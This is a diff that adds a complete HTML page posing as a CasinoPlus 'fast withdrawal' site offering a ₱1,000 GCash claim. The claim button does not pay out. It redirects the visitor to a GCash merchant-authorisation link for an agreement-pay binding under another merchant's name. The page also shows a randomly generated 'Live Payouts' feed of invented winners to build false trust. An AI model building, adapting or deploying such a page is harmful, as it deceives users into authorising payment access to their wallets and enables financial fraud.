@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CasinoPlus | Fast Withdrawal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: #0f172a; 
+            color: #f8fafc; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background: #1e293b;
+            width: 100%;
+            max-width: 420px;
+            padding: 30px 20px;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .logo-img {
+            width: 80%;
+            max-width: 250px;
+            margin: 0 auto 25px auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        h1 {
+            font-size: 18px;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 10px;
+        }
+
+        .amount {
+            font-size: 42px;
+            font-weight: 700;
+            color: #4ade80; 
+            margin-bottom: 25px;
+            text-shadow: 0 0 20px rgba(74, 222, 128, 0.4);
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 10px rgba(74, 222, 128, 0.2); }
+            to { text-shadow: 0 0 25px rgba(74, 222, 128, 0.8); }
+        }
+
+        .pay-button { 
+            background: linear-gradient(90deg, #0056b3, #007dfe); 
+            color: white; 
+            width: 100%;
+            padding: 18px; 
+            border: none; 
+            border-radius: 50px; 
+            font-size: 18px; 
+            font-weight: 700;
+            cursor: pointer; 
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 125, 254, 0.4);
+        }
+
+        .pay-button:disabled { background: #334155; cursor: not-allowed; box-shadow: none; }
+
+        #timer-text { display: none; color: #ef4444; font-weight: 700; margin-top: 15px; font-size: 14px; }
+
+        .promo-photo {
+            width: 100%;
+            border-radius: 16px;
+            margin-top: 25px;
+            display: block;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .winners-container {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 204, 0, 0.3);
+            padding: 15px;
+            border-radius: 16px;
+            margin: 25px 0;
+            text-align: left;
+        }
+
+        .winners-container h3 {
+            font-size: 14px;
+            color: #fbbf24;
+            margin-bottom: 12px;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .winner-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 13px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            /* IBALIK ANG TRANSITION ANIMATION DITO */
+            animation: slideIn 0.5s ease forwards;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .payout-green { color: #4ade80 !important; font-weight: 700; }
+
+        .gcash-mini {
+            width: 22px !important;
+            height: 22px !important;
+            min-width: 22px !important;
+            min-height: 22px !important;
+            object-fit: cover;
+            border-radius: 50%;
+            border: 1.5px solid #007dfe;
+            background: white;
+            flex-shrink: 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://casinoplus.static2.website/images/logo1.png" alt="Logo" class="logo-img">
+    
+    <h1>Claimable Balance</h1>
+    <div class="amount" id="balanceText">₱1,000.00</div>
+
+    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">
+        CLAIM THRU GCASH
+    </button>
+
+    <div id="timer-text">RECLAIM IN: <span id="waitTimer">05:00</span></div>
+
+    <img src="https://casinoplus.static2.website/images/casinoplus.jpeg" class="promo-photo" alt="Promo">
+
+    <div class="winners-container">
+        <h3>🔴 Live Payouts</h3>
+        <div id="winners-list"></div>
+    </div>
+</div>
+
+<script>
+    // NUMBER ANIMATION LOGIC
+    function animateValue(id, start, end, duration) {
+        const obj = document.getElementById(id);
+        let startTimestamp = null;
+        const step = (timestamp) => {
+            if (!startTimestamp) startTimestamp = timestamp;
+            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+            const currentVal = Math.floor(progress * (end - start) + start);
+            obj.innerHTML = "₱" + currentVal.toLocaleString() + ".00";
+            if (progress < 1) {
+                window.requestAnimationFrame(step);
+            }
+        };
+        window.requestAnimationFrame(step);
+    }
+
+    function redirectToGCash() {
+        const btn = document.getElementById('claimBtn');
+        const bal = document.getElementById('balanceText');
+        const timerDiv = document.getElementById('timer-text');
+
+        animateValue("balanceText", 1000, 0, 800); 
+        bal.style.color = "#64748b";
+        bal.style.animation = "none";
+
+        btn.disabled = true;
+        btn.innerHTML = "Processing...";
+        timerDiv.style.display = "block";
+
+        startTimer(300);
+
+        setTimeout(() => {
+            window.location.href = "https://m.gcash.com/gcashapp/gcash-merchants-auth/index.html?acqSiteId=2071216300000000&clientId=2018062511204800000679&merchantId=2163400000000013&merchantName=LAZADA&netAuthId=2026032519074400000440018408991&paySiteId=1022170000000000000&redirectUrl=https://open-ph.alipay.com/api/alipay/channel/gn/gcashmini/binding-callback.htm&scopes=AUTH_AGREEMENTPAY&state=2026032519031313002639244944125&terminalType=WEB&signature=$sign#/"; 
+        }, 1000);
+    }
+
+    function startTimer(sec) {
+        let timer = sec;
+        const display = document.getElementById('waitTimer');
+        const interval = setInterval(() => {
+            let m = Math.floor(timer / 60);
+            let s = timer % 60;
+            display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+            
+            if (--timer < 0) {
+                clearInterval(interval);
+                animateValue("balanceText", 0, 1000, 1200); 
+                const bal = document.getElementById('balanceText');
+                const btn = document.getElementById('claimBtn');
+                bal.style.color = "#4ade80";
+                bal.style.animation = "glow 2s infinite alternate";
+                btn.disabled = false;
+                btn.innerHTML = "CLAIM THRU GCASH";
+                document.getElementById('timer-text').style.display = "none";
+            }
+        }, 1000);
+    }
+
+    // ORIGINAL WINNER FUNCTION WITH GCASH ICON
+    function generateWinner() {
+        const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966', '0935', '0906'];
+        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+        const lastThree = Math.floor(100 + Math.random() * 900);
+        const myGcashImage = "https://casinoplus.static2.website/images/a227420d78aa5a2aaae939715e9ce864.jpg";
+
+        const winnerEntry = document.createElement('div');
+        winnerEntry.className = 'winner-item';
+        winnerEntry.innerHTML = `
+            <span>📱 ${randomPrefix}****${lastThree}</span>
+            <img src="${myGcashImage}" class="gcash-mini" alt="GCash">
+            <strong class="payout-green">+₱1,000</strong>
+        `;
+
+        const list = document.getElementById('winners-list');
+        if (list) {
+            list.prepend(winnerEntry);
+            if (list.children.length > 5) list.removeChild(list.lastChild);
+        }
+    }
+
+    generateWinner(); generateWinner();
+    setInterval(generateWinner, 3500);
+</script>
+
+<script src="https://static.app/js/static.js" type="text/javascript"></script>
+</body>
+</html>
